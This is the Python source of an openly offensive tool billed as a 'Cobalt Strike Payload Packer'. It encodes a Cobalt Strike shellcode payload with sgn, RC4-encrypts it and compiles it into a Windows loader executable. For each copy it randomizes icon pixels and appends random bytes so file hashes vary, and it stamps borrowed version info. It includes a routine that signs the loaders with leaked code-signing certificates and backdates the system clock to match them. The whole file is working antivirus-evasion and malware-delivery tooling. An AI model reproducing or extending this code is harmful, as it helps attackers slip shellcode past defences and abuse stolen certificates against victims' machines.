import random
import subprocess
from PIL import Image, ImageChops
import os
import argparse
import string
import ctypes
import shutil
from colorama import init, Fore, Back, Style
import sys


# $$RC4_KEY$$
# $$SHELLCODE$$
# $$CDF_FILENAME$$
# $$SEC_STR$$

bullshit = ["qaxnb!", "360nb", "sb_qax", "chang_ting_tian_xia_di_yi", "dacA1niao", "cblab666"]
cdf_filename = ["C:\\\\Windows\\\\system32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\win.ini", "C:\\\\Windows\\\\system32\\\\license.rtf", "C:\\\\Windows\\\\system32\\\\drivers\\\\etc\\\\protocol", "C:\\\\Windows\\\\system.ini"]


def load_config(config_path):
    with open(config_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()
    keys = lines[0].strip().split(',')
    result = []

    for line in lines[1:]:
        values = line.strip().split(',')
        entry = {key: value for key, value in zip(keys, values)}
        result.append(entry)
    
    return result

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = []

    # Key-scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    # Pseudo-random generation algorithm (PRGA)
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(chr(ord(char) ^ K))
    
    return ''.join(out)

def print_help_info():
    slogan = Fore.GREEN + """

 ██▓███   ▄▄▄     ▓██   ██▓ ██▓     ▒█████   ▄▄▄      ▓█████▄     ██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██░  ██▒▒████▄    ▒██  ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌   ▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌   ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌   ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓    ▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒    ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░▒ ░       ▒   ▒▒ ░▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒    ░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░░         ░   ▒   ▒ ▒ ░░    ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░    ░░         ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
               ░  ░░ ░         ░  ░    ░ ░        ░  ░   ░                      ░  ░░ ░      ░  ░      ░  ░   ░     
                   ░ ░                                 ░                            ░                               
"""
    print(slogan)
    print(Fore.RED + "\n\tCobalt Strike Payload Packer")                                                        
    print("\n\tVersion: 1.0")                                                      
    print("\n\tAuthor: @Adan0s\n")
    print("\n\t2024/06/19\n")
    


def read_binary_file_as_hex(file_path):
    try:
        with open(file_path, 'rb') as file:
            binary_data = file.read()
        hex_data = binary_data.hex()
        return hex_data
    except FileNotFoundError:
        return "File not found."
    except Exception as e:
        return f"An error occurred: {e}"

def generate_random_hex_16():
    random_hex = ''.join(random.choices('0123456789abcdef', k=16))
    return random_hex

def convert_to_hex_payload(normal_string):
    try:
        # Convert the normal string to hex and format it with \x prefix
        hex_payload = ''.join(f'\\x{ord(char):02x}' for char in normal_string)
        return hex_payload
    except Exception as e:
        return f"An error occurred: {e}"
    
def format_shellcode(shellcode):
    if len(shellcode) % 4 != 0:
        raise ValueError("Input string length must be a multiple of 4")

    formatted_list = [f"0x{shellcode[i+2:i+4]}" for i in range(0, len(shellcode), 4)]
    result = ', '.join(formatted_list)
    
    return result
    

def add_alpha_channel(image, color=(255, 255, 255)):
    if image.mode == "RGB":
        # 创建一个具有透明通道的新图像
        alpha_img = Image.new("L", image.size, 255)
        image = Image.merge("RGBA", (image, alpha_img))

        # 将背景色变为透明
        bg = Image.new("RGBA", image.size, color + (255,))
        diff = ImageChops.difference(image, bg)
        diff = ImageChops.add(diff, diff, 2.0, -100)
        bbox = diff.getbbox()
        if bbox:
            return image.crop(bbox)
    return image

def modify_icon_color(input_file, output_file, max_color_change):
    # 读取.ico文件
    img = Image.open(input_file)

    # 获取图像的RGB数据，并添加透明通道
    pixels = img.convert("RGBA")
    pixels = add_alpha_channel(pixels)

    # 保存原始图标尺寸信息
    original_sizes = img.info.get("sizes")

    # 遍历每个像素点
    for y in range(pixels.height):
        for x in range(pixels.width):
            r, g, b, a = pixels.getpixel((x, y))

            # 随机修改RGB颜色
            r_change = random.randint(-max_color_change, max_color_change)
            g_change = random.randint(-max_color_change, max_color_change)
            b_change = random.randint(-max_color_change, max_color_change)

            r = max(0, min(255, r + r_change))
            g = max(0, min(255, g + g_change))
            b = max(0, min(255, b + b_change))

            # 更新像素值
            pixels.putpixel((x, y), (r, g, b, a))
            
    # 保存修改后的图像为.ico文件，并保留原始图标尺寸信息
    pixels.save(output_file, format="ICO", sizes=original_sizes, append_images=[Image.new("RGBA", (1, 1), (0, 0, 0, 0))])
    # 添加随机字节以生成不同的哈希值
    with open(output_file, "ab") as f:
        f.write(os.urandom(random.randint(500, 1024)))


def generate_random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + ".ico"

def add_icon_to_exe(icon_file, exe_file, output_file):
    command = f'include\ResourceHacker -open "{exe_file}" -save "{output_file}" -action addskip -res "{icon_file}" -mask ICONGROUP,MAINICON,'
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    

def add_description_info(exe_file, descriptions):
    # 使用rcedit工具为exe文件添加版本信息
    #print(descriptions)
    desc_name = descriptions.keys()
    for desc in desc_name:
        command = 'include\\rcedit "{}" --set-version-string "{}" "{}"'.format(exe_file, desc, descriptions[desc])
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def getstrRandom():
    # 生成随机8位字符串
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    sa = []
    for i in range(8):
        sa.append(random.choice(seed))
    strRandom = ''.join(sa)
    return strRandom

def generate_icons(input_icon_file, num_icons, max_color_change, inputfile):
    exe_file = inputfile
    generated_icon_files = []

    for i in range(num_icons):
        output_icon_file = generate_random_filename()
        modify_icon_color(input_icon_file, output_icon_file, max_color_change)
        output_exe_file = f"output/{getstrRandom()}.exe"  # 将生成的exe文件放入output文件夹
        add_icon_to_exe(output_icon_file, exe_file, output_exe_file)
        # 将生成的图标文件名添加到列表中
        generated_icon_files.append(output_icon_file)
        #print(f"生成第 {i+1} 个图标并添加到 {output_exe_file}")

    # 删除生成的.ico文件
    for icon_file in generated_icon_files:
        os.remove(icon_file)


def sign_with_leak_cert(input_filename, output_file, cert_name, leaked_certs):
    command = "include\\signtool.exe sign /debug /v /t http://timestamp.digicert.com /fd SHA256"
    args = ""
    shutil.copy2(input_filename, output_file)

    for cert in leaked_certs:
        #print(cert)
        if cert["name"] == cert_name:
            args += " /f certs\\{}\\{}".format(cert["name"], cert["cert_name"])
            if cert["password"] != "":
                args += " /p {}".format(cert["password"])
            if cert["extra_cert_name"] != "":
                args += " /ac certs\{}\{}".format(cert["name"], cert["extra_cert_name"])
            if cert["change_date"] != "":
                change_local_date(cert["change_date"])
            args += " /a {}".format(output_file)
            command += args
            
            print("[+] Start sign the file......")
            subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            break
        else:
            print("[!] Can't find this cert! ")
            exit(-1)
        

        

def check_privilege(): 
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def change_local_date(change_date):
    class SYSTEMTIME(ctypes.Structure):
        _fields_ = [
            ("wYear", ctypes.c_uint16),
            ("wMonth", ctypes.c_uint16),
            ("wDayOfWeek", ctypes.c_uint16),
            ("wDay", ctypes.c_uint16),
            ("wHour", ctypes.c_uint16),
            ("wMinute", ctypes.c_uint16),
            ("wSecond", ctypes.c_uint16),
            ("wMilliseconds", ctypes.c_uint16),
        ]
    change_date_s = change_date.split("-")
    print(change_date_s)
    system_time = SYSTEMTIME()
    system_time.wYear = int(change_date_s[0])
    system_time.wMonth = int(change_date_s[1])
    system_time.wDay = int(change_date_s[2])
    system_time.wHour = 13
    system_time.wMinute = 13
    system_time.wSecond = 13
    system_time.wMilliseconds = 13

    if check_privilege():
        result = ctypes.windll.kernel32.SetSystemTime(ctypes.byref(system_time))
    
        if result == 0:
            raise ctypes.WinError()
        else:
            print(f"System date set to {system_time.wYear}-{system_time.wMonth:02d}-{system_time.wDay:02d}")
    else:
        print("[!] Not Local Admin !")
        exit(-1)
    
def patch_template_file(key, shellcode, cdf_file, sec_str, src_path):
    shutil.copy2("{}/src/main.cpp.temp".format(src_path), "{}/src/main.cpp".format(src_path))

    print("\t[*] Opening loader template file......")
    with open("{}/src/main.cpp".format(src_path), 'r', encoding='utf-8') as file:
        file_contents = file.read()
    
    print("\t[*] Replace key, shellcode and some bullshit......")
    file_contents = file_contents.replace("$$RC4_KEY$$", key)
    file_contents = file_contents.replace("$$SHELLCODE$$", shellcode)
    file_contents = file_contents.replace("$$CDF_FILENAME$$", cdf_file)
    file_contents = file_contents.replace("$$SEC_STR$$", sec_str)
    
    print("\t[*] Writing loader template file......")
    with open("{}/src/main.cpp".format(src_path), 'w', encoding='utf-8') as file:
        file.write(file_contents)
    
    print("\t[+] Patch loader template file done.")
    

def compile_with_cmake(gpp_path, gcc_path, src_path, out_path):
    print("\t[*] Start CMake compile....")
    compile_command = "cmake --no-warn-unused-cli -DCMAKE_BUILD_TYPE:STRING=Release -DCMAKE_C_COMPILER:FILEPATH={} -DCMAKE_CXX_COMPILER:FILEPATH={} -S{} -B{}/build -G \"MinGW Makefiles\"".format(gcc_path, gpp_path, src_path, src_path)
    compile_command2 = "cmake --build {}/build --config Release --target all -j 22 --".format(src_path)
    #subprocess.run(compile_command, shell=True)
    #subprocess.run(compile_command2, shell=True)
    subprocess.run(compile_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(compile_command2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if(os.path.exists("{}/build/Loader.exe".format(src_path))):
        print("\t[+] Compile done.")
        shutil.copy2("{}/build/Loader.exe".format(src_path), "{}/Loader.exe".format(out_path))
        print("\t[+] Loader.exe in {}".format(out_path))
        shutil.rmtree("{}/build".format(src_path))
        os.remove("{}/src/main.cpp".format(src_path))
        print("\t[*] Clear build cache done.")
    else:
        print("\t[!] Something wrong (Compile)!")
        exit(-1)

def get_random_thing(l):
    return random.choice(l)

def list_files(directory):
    try:
        items = os.listdir(directory)    
        files = [item for item in items if os.path.isfile(os.path.join(directory, item))]
        return files
    except FileNotFoundError:
        print(Fore.RED + "[!] Error: File not found")
        return None
    except Exception as e:
        return str(e)

def sgn_for_shellcode(input_file):
    command = f'include\sgn -i {input_file} -o {input_file}_sgn -a 64 -c 5 -M 10'
    #print(command)
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    init(autoreset=True)
    print_help_info()
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", dest="payload_filename", required=True, help="Cobalt Strike生成的Raw格式payload路径（.bin文件）")
    parser.add_argument("-i", "--icon-path", dest="icon_path", required=True, help="图标文件所在的路径")
    parser.add_argument("-n", "--number", dest="num_icons", type=int, default=5, help="要生成的图标数量")
    parser.add_argument("-maxc", "--maxcolorchange", dest="max_color_change", type=int, default=8, help="最大颜色变化范围")
    args = parser.parse_args()

    script_path = os.path.abspath(sys.argv[0])
    script_dir = os.path.dirname(script_path)

    print(Fore.GREEN + "\n[+] Stage 1: Processing of shellcode using sgn\n")
    sgn_for_shellcode(args.payload_filename)
    print("\t[*] Sgn done ＼(＾O＾)／")

    print(Fore.GREEN + "\n[+] Stage 2: Generate random RC4 key and encrypt shellcode\n")
    rc4_key = generate_random_hex_16()
    print("\t[*] Get random rc4 key: {}".format(Fore.YELLOW + rc4_key))
    hex_payload = read_binary_file_as_hex(args.payload_filename + "_sgn")
    hex_encrypted_payload = rc4(rc4_key, hex_payload)
    hex_format_encrypted_payload = convert_to_hex_payload(hex_encrypted_payload)
    format_payload = format_shellcode(hex_format_encrypted_payload)
    print("\t[*] Encrypt shellcode...")

    print(Fore.GREEN + "\n[+] Stage 3: Patch template file and compile with cmake\n")

    
    patch_template_file(rc4_key, format_payload, get_random_thing(cdf_filename), get_random_thing(bullshit), "{}\\Loader".format(script_dir))
    compile_with_cmake("C:\\tools\\mingw64\\bin\\g++.exe", "C:\\tools\\mingw64\\bin\\gcc.exe", "{}\\Loader".format(script_dir), "{}\\output".format(script_dir))

    print(Fore.GREEN + "\n[+] Stage 4: Add resource to loader\n")

    loader_file = "{}\\output\\Loader.exe".format(script_dir) 
    cert_info = load_config("{}\\config\\description.txt".format(script_dir))
    leaked_certs = load_config("{}\\config\\cert.txt".format(script_dir))
    print("\t[*] Please wait a second...")
    add_description_info(loader_file, get_random_thing(cert_info))   
    generate_icons(args.icon_path, args.num_icons, args.max_color_change, loader_file)
    #all_loader_files = list_files("{}\\output".format(script_dir))
    #for f in all_loader_files:
    #    sign_with_leak_cert("{}\\output\\{}".format(script_dir, f), "{}\\output\\zz_{}".format(script_dir, f), "123456", leaked_certs)

    print(Fore.GREEN + "\n[+] Done !\n")
